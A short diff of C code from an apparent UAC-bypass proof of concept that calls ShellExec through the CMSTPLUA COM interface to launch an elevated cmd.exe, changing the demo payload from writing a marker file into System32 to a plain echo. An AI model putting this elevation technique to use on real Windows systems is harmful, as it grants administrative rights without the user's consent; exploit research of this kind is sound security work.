@@ -138,7 +138,7 @@ HRESULT fn_call_CMSTPLUA_shellexecute()
 	if (hr != S_OK)
 		return hr;
 
-	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, L"cmd.exe", L"/k \"echo exploit done. > C:\\Windows\\System32\\misc && type misc", NULL, SEE_MASK_DEFAULT, SW_SHOW);
+	hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, L"cmd.exe", L"/k \"echo exploit done.", NULL, SEE_MASK_DEFAULT, SW_SHOW);
 	if (CMLuaUtil != NULL)
 		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
 	return hr;
